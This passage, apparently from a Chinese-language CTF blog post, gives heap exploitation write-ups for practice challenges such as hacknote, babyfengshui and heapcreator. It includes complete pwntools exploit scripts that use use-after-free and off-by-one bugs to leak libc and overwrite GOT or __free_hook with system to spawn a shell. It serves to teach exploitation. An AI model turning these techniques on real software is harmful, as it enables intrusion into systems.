class="comment">#fake 4</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h2><p>IDA</p>
<ul>
<li><p>add</p>
<p><img src="/article/Heap_Exploitation/image-20211011172315258.png" alt="image-20211011172315258"></p>
<p><img src="/article/Heap_Exploitation/image-20211011172337116.png" alt="image-20211011172337116"></p>
</li>
<li><p>free</p>
<p><img src="/article/Heap_Exploitation/image-20211011172435496.png" alt="image-20211011172435496"></p>
</li>
<li><p>show</p>
<p><img src="/article/Heap_Exploitation/image-20211011173034530.png" alt="image-20211011173034530"></p>
</li>
</ul>
<h3 id="uaf利用"><a href="#uaf利用" class="headerlink" title="uaf利用"></a>uaf利用</h3><p>先释放<code>chunk0</code>、<code>chunk1</code>，再申请一个<code>0x8</code>的<code>chunk2</code>。此时<code>chunk2</code>的<code>note</code>块是<code>chunk1</code>的<code>note</code>块，<code>content</code>块是<code>chunk0</code>的<code>note</code>块（fastbins是FILO）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(puts_got)</span><br><span class="line">add(<span class="number">0x8</span>,payload)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>



<p><img src="/article/Heap_Exploitation/image-20211011174007048.png" alt="image-20211011174007048"></p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25049</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content :&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(puts_got)</span><br><span class="line">add(<span class="number">0x8</span>,payload)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + <span class="string">&#x27;;sh\x00&#x27;</span></span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h2><p>保护</p>
<p><img src="/article/Heap_Exploitation/image-20210413194353222.png" alt="image-20210413194353222"></p>
<p>del函数中free没有清零，经典uaf。</p>
<p><img src="/article/Heap_Exploitation/image-20210413201741472.png" alt="image-20210413201741472"></p>
<p>并且程序有getshell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29405</span>)</span><br><span class="line"></span><br><span class="line">magic_addr =  <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment"># heap 0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment"># heap 1 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









































































<h1 id="Chunk-Address"><a href="#Chunk-Address" class="headerlink" title="Chunk Address"></a>Chunk Address</h1><p>关于堆管理数组的漏洞</p>
<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p><img src="/article/Heap_Exploitation/image-20210415201237083.png" alt="image-20210415201237083"></p>
<p>IDA</p>
<p>3个主要功能</p>
<ul>
<li>add</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210415212312902.png" alt="image-20210415212312902"></p>
<p>我们申请的chunk用来存放 description（text）的数据，系统默认再申请一个0x80大小的chunk来存放 name ，并且把 description 的地址放到了 name 的数据中。<br>比如我们申请一个0x80的 chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210415203230331.png" alt="image-20210415203230331"></p>
<p>修改 -&gt; 泄露 -&gt; libcbase</p>
<ul>
<li>update</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210415212252793.png" alt="image-20210415212252793"></p>
<p>add函数之后会进入updata函数，这里限制了输入的长度，对于chunk0来说，就是0x80c008+输入长度是否大于0x804c08c，但是，有一个问题就是，chunk0和chunk0(name)其实不一定是相邻的，这样的话就有了实现溢出的可能。</p>
<ul>
<li><p>free</p>
<p>会清零数据，无法利用</p>
</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>先申请几个小的chunk，然后释放第1个chunk，再申请一个大的chunk，让大chunk的 description 数据域在最前面， name 数据域在所有chunk的后面，通过 edit 来堆溢出</li>
<li>通过堆溢出修改第2个 chunk 中指向自己 name 数据域的指针指向 free_got ，再 Display 即可泄露出 free 地址，算出libcbase</li>
<li>直接修改第2个 chunk 指向自己 name 数据域的指针指向 system ，再执行 free 函数时：free(‘/bin/sh’) -&gt; system(‘/bin/sh’)</li>
</ul>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyfengshui_33c3_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28333</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,text</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size of description: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content))) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,content)  </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name2&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name3&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x198</span> + p32(free_got) </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;name4&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p32(sys_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><h3 id="Off-By-One-1"><a href="#Off-By-One-1" class="headerlink" title="Off-By-One"></a>Off-By-One</h3><h3 id="功能函数"><a href="#功能函数" class="headerlink" title="功能函数"></a>功能函数</h3><ul>
<li>add</li>
<li><img src="/article/Heap_Exploitation/image-20211021183543418.png" alt="image-20211021183543418"></li>
</ul>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25095</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Heap(0x10 or 0x20 only) : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">heap_array = <span class="number">0x6020A0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x38</span>) + p64(free_got)</span><br><span class="line">add(<span class="number">0x38</span>,payload)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#######################</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x38</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x38</span>,payload)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="Overlapping"><a href="#Overlapping" class="headerlink" title="Overlapping"></a>Overlapping</h1><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><p>菜单堆题</p>
<p>IDA</p>
<ul>
<li>create</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210722183034862.png" alt="image-20210722183034862"></p>
<ul>
<li><p>edit</p>
<p><img src="/article/Heap_Exploitation/image-20210722183123853.png" alt="image-20210722183123853"></p>
<p>存在 off by one </p>
</li>
</ul>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26591</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap : &#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x81&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x70</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,addr)</span><br><span class="line">libc_base = addr - libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><ul>
